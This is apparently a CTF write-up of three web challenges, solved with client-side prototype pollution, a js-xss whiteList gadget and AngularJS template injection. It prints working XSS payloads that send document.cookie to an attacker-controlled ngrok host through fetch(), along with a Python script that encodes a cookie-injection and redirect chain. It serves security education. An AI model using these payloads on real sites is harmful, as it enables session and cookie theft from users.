# DOM i huvudet - (22 Solves)

DOM In The Head was labelled as an easy challenge in Cyber Fest CTF, yet it combined an interesting web attack vectors such as Prototype Pollution abusing vulnerable open-source javascript libraries. 

```html
...snip...
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">
  <script src="https://raw.githack.com/hirak/phpjs/master/functions/strings/parse_str.js"></script>
  <script src="https://raw.githack.com/leizongmin/js-xss/master/dist/xss.js"></script>
...snip...
<script>
	function insertBefore(newNode, existingNode) {
		existingNode.parentNode.insertBefore(newNode, existingNode);
	};
	const queryString = window.location.search;
	const urlParams = new URLSearchParams(queryString);
	if (urlParams.has('name') && (urlParams.get('name') !== "")) {
		var arr = {};
		parse_str(location.search.slice(1), arr);
		document.getElementById("name").innerHTML = "input: "+filterXSS(arr["name"]);
	};
</script>
...snip...
```

From the given code we know that **js-xss** and **phpjs**  are being imported and used from the client-side. **parse_str** was being used to parse query strings from **location.search**. 

## Client-Side Prototype Pollution 

Because this was not the first time I am dealing with **phpjs** I immediatly knew that this was exploitable using prototype pollution, but you can read more about it [here](https://github.com/BlackFan/client-side-prototype-pollution/blob/master/pp/parse_str.md). 


To reach the part where we can trigger this, we need to add a dummy name as parameter, below is a sample payload

```
http://domihuvudet-1.ctfx.hackaplaneten.se:8001/?__proto__[test]=test&name=1
```

This can be also confirmed using our browser's dev tools

```
>> x = {}
Object {  }

>> x.test
"test"
```
## Locating Gadgets in js-xss

Now that we have confirmed that, we need to look up for gadgets since this doesn't help thus far, luckily, **filterXSS** was also being called to sanatize our input from **name**, after doing some [research](https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/js-xss.md), it appeared that we can utilize a gadget called **whiteList** where we can specify what to whitelist. 

Its a matter of connecting the puzzle peaces now, Client-Side Prototype Pollution > Utilizing the whiteList gadget > XSS. 

Putting all of it together and submitting it to the admin bot came back with flag in **document.cookie**

```
http://domihuvudet-1.ctfx.hackaplaneten.se:8001/index.php?__proto__[whiteList][img]=[onerrorr,src,c]&name=<img src=x onerror=fetch('https://NGROK/?'+btoa(document.cookie))>
```

# Legacy (18 Solves)

Legacy was an Angular.js based challenge, it was a static application where there wasn't room for user input. 

Upon loading the page, a fetch request was being made to **/helloworld.js**

```js
document.cookie="dummy=legacy1";
var myApp = angular.module('helloworld', ['ui.router']);

myApp.config(function($stateProvider) {
  var helloState = {
    name: 'hello',
    url: '/hello',
    template: '<h3>hello world!</h3>'
  }

  var aboutState = {
    name: 'about',
    url: '/about',
    template: '<h3>Its the UI-Router hello world app!</h3>'
  }

  var indexState = {
    name: 'index',
    url: '/',
    template: '<h3>Index</h3>'
  }

  template = document.createElement("span")
  template.innerHTML = "<h3>404</h3>path not found: "
  sanitizer = document.createElement("code")
  sanitizer.innerText = document.location
  template.appendChild(sanitizer)
  var f04State = {
    name: '404',
    url: '/404',
    template: template.innerHTML
  };

  $stateProvider.state(helloState);
  $stateProvider.state(aboutState);
  $stateProvider.state(indexState);
  $stateProvider.state(f04State);
});

myApp.config(["$locationProvider","$urlRouterProvider", function($locationProvider,$urlRouterProvider) {
  $locationProvider.html5Mode(true);
  console.log($urlRouterProvider);
  $urlRouterProvider.otherwise('/404');
}]);
```


## Clinet-Side Template Injection

Looking at the above snippet, we know that our input is being rendered directly using **innerHTML** as a template

```js
 template = document.createElement("span")
  template.innerHTML = "<h3>404</h3>path not found: "
  sanitizer = document.createElement("code")
  sanitizer.innerText = document.location
  template.appendChild(sanitizer)
  var f04State = {
    name: '404',
    url: '/404',
    template: template.innerHTML
  };
```

It was possible to confirm this using the **/404** endpoint using the below 
```
http://legacy-1.ctf.hackaplaneten.se:8001/404?{{7*7}}
```

Which came back with a response that contained a successful injection message, knowing that the goal was XSS, it was challenging to craft payloads with quotes, doing a bit of research, I was able to find payloads without quotes, the following payload achieved **alert(1)**

```
http://legacy-1.ctf.hackaplaneten.se:8001/404?{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}} 
```

Adapting it to steal admin's cookie, we got the flag. 


# legacyversion2 (12 Solves)

Legacy2 was the revenge for Legacy, similar to Legacy where Angular.js is also taking care of the application's functionality. 

A note was given in the challenge description stating we will still need **Legacy's** XSS for this challenge. 

```html
<!doctype html>
<html ng-app="myApp">
  <head>
    <script src="https://cdn.rawgit.com/SlexAxton/messageformat.js/v1.0.2/messageformat.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.5.5/angular.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.5.5/angular-animate.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.5.5/angular-cookies.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.5.5/angular-sanitize.js"></script>
    <script src="https://cdn.rawgit.com/angular-translate/bower-angular-translate/2.19.0/angular-translate.js"></script>
    <script src="https://cdn.rawgit.com/angular-translate/bower-angular-translate-interpolation-messageformat/2.19.0/angular-translate-interpolation-messageformat.js"></script>
    <script src="https://cdn.rawgit.com/angular-translate/bower-angular-translate-storage-cookie/2.19.0/angular-translate-storage-cookie.js"></script>
    <script src="https://cdn.rawgit.com/angular-translate/bower-angular-translate-storage-local/2.19.0/angular-translate-storage-local.js"></script>
    <script src="https://cdn.rawgit.com/angular-translate/bower-angular-translate-loader-url/2.19.0/angular-translate-loader-url.js"></script>
    <script src="https://cdn.rawgit.com/angular-translate/bower-angular-translate-loader-static-files/2.19.0/angular-translate-loader-static-files.js"></script>
    <script src="https://cdn.rawgit.com/angular-translate/bower-angular-translate-handler-log/2.19.0/angular-translate-handler-log.js"></script>
    <script src="script.js"></script>
  </head>
  <body>
    <div ng-controller="Ctrl">
      <p>{{ 'HEADLINE' | translate }}</p>
      <p>{{ 'PARAGRAPH' | translate }}</p>
    
      <p translate>PASSED_AS_TEXT</p>
      <p translate="PASSED_AS_ATTRIBUTE"></p>
      <p translate>{{ 'PASSED_AS_INTERPOLATION' }}</p>
      <p translate="{{ 'PASSED_AS_INTERPOLATION' }}"></p>
      <p translate="VARIABLE_REPLACEMENT" translate-values="{ name: 'PascalPrecht' }"></p>
    
      <button ng-click="changeLanguage('de')" translate="BUTTON_LANG_DE"></button>
      <button ng-click="changeLanguage('en')" translate="BUTTON_LANG_EN"></button>
    </div>
  </body>
</html> 
```

The only place where there was room for user input was **NG_TRANSLATE_LANG_KEY** where it only accepts two values **en** or **de**, this was clear from **script.js**


```js
document.cookie="dummy=legacy1";
var app = angular.module('myApp', ['ngCookies', 'pascalprecht.translate']);

app.config(['$translateProvider', function ($translateProvider) {
  $translateProvider.translations('en');
  // configures staticFilesLoader
  $translateProvider.useStaticFilesLoader({
    prefix: '',
    suffix: '.json'
  });
  // load 'en' table on startup
  $translateProvider.preferredLanguage('en');
  $translateProvider.useCookieStorage();
  
}]);
  
app.controller('Ctrl', ['$translate', '$scope', function ($translate, $scope) {
  
  $scope.changeLanguage = function (langKey) {
    $translate.use(langKey);
  };
}]);
```

Looking at the prefix and suffix, I've noticed that there's room for path manipulation, this is very similar to Client-Side Directory Traversal vector, except we don't need to traverse this time. 

The logic is simple, if we choose **en** as language, it will fetch **/en.json**, this means we can also use our main domain where we are controlling the JSON file. Below is en.json's contents

```json
{
    "HEADLINE": "What an awesome module!",
    "PARAGRAPH": "Srsly!",
    "PASSED_AS_TEXT": "Hey there! I'm passed as text value!",
    "PASSED_AS_ATTRIBUTE": "I'm passed as attribute value, cool ha?",
    "PASSED_AS_INTERPOLATION": "Beginners! I'm interpolated!",
    "VARIABLE_REPLACEMENT": "Hi {{name}}",
    "BUTTON_LANG_DE": "German",
    "BUTTON_LANG_EN": "English"
}
```

# Client-Side Template Injection

Looking closely at **VARIABLE_REPLACEMENT**, we notice that it's rendering the **name** into Angular's templates. By modifying the **NG_TRANSLATE_LANG_KEY** into my ngrok instance, I got a hit. 

```
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
127.0.0.1 - - [26/May/2023 03:27:30] code 404, message File not found
127.0.0.1 - - [26/May/2023 03:27:30] "GET /a.json HTTP/1.1" 404 -
```

Our goal is simple now, create a crafted json file & use **Legacy's** XSS (since this is a self one) & WIN! 

Below is my crafted JSON file

```JSON
{
    "HEADLINE": "What an awesome module!",
    "PARAGRAPH": "Srsly!",
    "PASSED_AS_TEXT": "Hey there! I'm passed as text value!",
    "PASSED_AS_ATTRIBUTE": "I'm passed as attribute value, cool ha?",
    "PASSED_AS_INTERPOLATION": "Beginners! I'm interpolated!",
    "VARIABLE_REPLACEMENT": "x <div><style><style/><img src=x onerror=\"fetch('https://NGROK/?'+document.cookie)\"/>",
    "BUTTON_LANG_DE": "German",
    "BUTTON_LANG_EN": "English"
}
```


By visiting the page, I recieved a callback with my own cookies, so now we need to figure out a way where we can have the admin to visit our page. Because I had a working payload in **Legacy**, it was a matter of forcing the browser to create a new cookie pointing to **legacyversion2-1.ctf.hackaplaneten.se**. 

The logic I came up with was simple: <br /> 

- Force the browser to add a new cookie **NG_TRANSLATE_LANG_KEY** with a value to our ngrok domain <br /> 
- Craft a malicious Client-Side Template Injection in **name** <br /> 
- Redirect to **legacyversion2-1.ctf.hackaplaneten.se** using **location.href** <br />
- Once we get a hit, **fetch** will send a request to our server alnog with the flag <br />
- WIN


It was annoying to play with ASCII, so I created a Python script to ease up the process, below is the final payload

```py
payload = 'document.cookie = "NG_TRANSLATE_LANG_KEY=https://30f7-2001-8f8-153b-ef50-5c7a-c72d-c6fd-86ad.eu.ngrok.io/xx;path=/;domain=.ctf.hackaplaneten.se";window.location.href = "http://legacyversion2-1.ctf.hackaplaneten.se:8001/demo/"'
lst = []
for i in payload:
	try:
		lst.append(ord(i))
	except:
		pass
joined_string = ','.join(str(element) for element in lst)
final ="""http://legacy-1.ctf.hackaplaneten.se:8001/404?{{{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x({}))()}}}}""".format(joined_string)
print(final)


## http://legacy-1.ctf.hackaplaneten.se:8001/404?{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,32,61,32,34,78,71,95,84,82,65,78,83,76,65,84,69,95,76,65,78,71,95,75,69,89,61,104,116,116,112,115,58,47,47,51,48,102,55,45,50,48,48,49,45,56,102,56,45,49,53,51,98,45,101,102,53,48,45,53,99,55,97,45,99,55,50,100,45,99,54,102,100,45,56,54,97,100,46,101,117,46,110,103,114,111,107,46,105,111,47,120,120,59,112,97,116,104,61,47,59,100,111,109,97,105,110,61,46,99,116,102,46,104,97,99,107,97,112,108,97,110,101,116,101,110,46,115,101,34,59,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,32,61,32,34,104,116,116,112,58,47,47,108,101,103,97,99,121,118,101,114,115,105,111,110,50,45,49,46,99,116,102,46,104,97,99,107,97,112,108,97,110,101,116,101,110,46,115,101,58,56,48,48,49,47,100,101,109,111,47,34))()}}
```

By submitting this to the admin, we got the flag.


![image](https://github.com/ixSly/CTFs/assets/32583633/1ab5b682-8a46-4877-9793-a8e9cc991b56)

